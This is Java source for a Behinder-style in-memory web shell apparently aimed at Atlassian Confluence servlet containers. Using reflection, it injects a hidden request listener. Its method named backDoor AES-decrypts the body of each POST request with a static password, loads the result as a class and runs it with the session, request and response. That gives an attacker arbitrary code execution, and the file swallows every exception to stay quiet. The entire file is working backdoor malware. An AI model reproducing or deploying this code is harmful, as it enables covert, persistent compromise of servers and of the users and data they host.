package main.MemShell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class BehinderMemShell extends ClassLoader implements InvocationHandler {
    private static boolean initialized = false;
    private static Object lock = new Object();
    private static String password;

    public BehinderMemShell(ClassLoader loader) {
        super(loader);
    }

    public BehinderMemShell() {
        synchronized (lock) {
            if (!initialized) {
                try {
                    Class servletRequestListenerClass = null;

                    try {
                        servletRequestListenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
                    } catch (Exception var7) {
                        try {
                            servletRequestListenerClass = Class.forName("javax.servlet.ServletRequestListener");
                        } catch (ClassNotFoundException var6) {
                        }
                    }

                    if (servletRequestListenerClass != null) {
                        this.addListener(Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{servletRequestListenerClass}, this), this.getStandardContext());
                    }
                } catch (Throwable var8) {
                }

                initialized = true;
            }

        }
    }

//    private Object getStandardContext() {
//        try {
//            Object request = Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getRequest").invoke((Object) null);
//            Object servletContext = this.invokeMethod(request, "getServletContext");
//            return getFieldValue(getFieldValue(servletContext, "context"), "context");
//        } catch (Exception var3) {
//            return null;
//        }
//    }

    private Object getStandardContext() {
        try {
            Object servletActionContextCompatManager = Class.forName("com.atlassian.confluence.compat.struts2.servletactioncontext.ServletActionContextCompatManager").newInstance();
            Method getRequest = Class.forName("com.atlassian.confluence.compat.struts2.servletactioncontext.ServletActionContextCompatManager").getMethod("getRequest");
            Object request = getRequest.invoke(servletActionContextCompatManager, null);
            Object servletContext = invokeMethod(request, "getServletContext");
            return getFieldValue(getFieldValue(servletContext, "context"), "context");
        } catch (Exception e) {

            return null;
        }
    }

    private String addListener(Object listener, Object standardContext) throws Exception {
        Method addApplicationEventListenerMethod = standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class);
        addApplicationEventListenerMethod.setAccessible(true);
        addApplicationEventListenerMethod.invoke(standardContext, listener);
        return "ok";
    }

    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("requestInitialized")) {
            Object servletRequestEvent = args[0];
            this.backDoor(servletRequestEvent);
        }

        return null;
    }

    private Object invokeMethod(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, ((Class[]) classes.toArray(new Class[0])));

            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    public String getParameter(Object requestObject, String name) {
        return (String) invokeMethod(requestObject, "getParameter", name);
    }

    public String getContentType(Object requestObject) {
        return (String) invokeMethod(requestObject, "getContentType");
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    private void backDoor(Object servletRequestEvent) {
        try {
            Object request = this.invokeMethod(servletRequestEvent, "getServletRequest");
            Object responseforvalidate = getFieldValue(getFieldValue(request, "request"), "response");
            this.invokeMethod(responseforvalidate, "setHeader", "X-Cmd-Result", "ok");

            if (this.invokeMethod(request, "getMethod").equals("POST")) {
                String k = password;
                HttpSession session = (HttpSession) this.invokeMethod(request, "getSession");
                session.setAttribute("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] bytesDecrypted = c.doFinal(Base64.getDecoder().decode(((BufferedReader) ((BufferedReader) this.invokeMethod(request, "getReader"))).readLine()));
                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                method.setAccessible(true);
                Class newClass = (Class) method.invoke(this.getClass().getClassLoader(), bytesDecrypted, 0, bytesDecrypted.length);
                Object response = getFieldValue(getFieldValue(request, "request"), "response");
                Map<String, Object> pageContext = new HashMap();
                pageContext.put("session", session);
                pageContext.put("request", request);
                pageContext.put("response", response);
                newClass.newInstance().equals(pageContext);
            }
        } catch (Exception var11) {
        }

    }
}
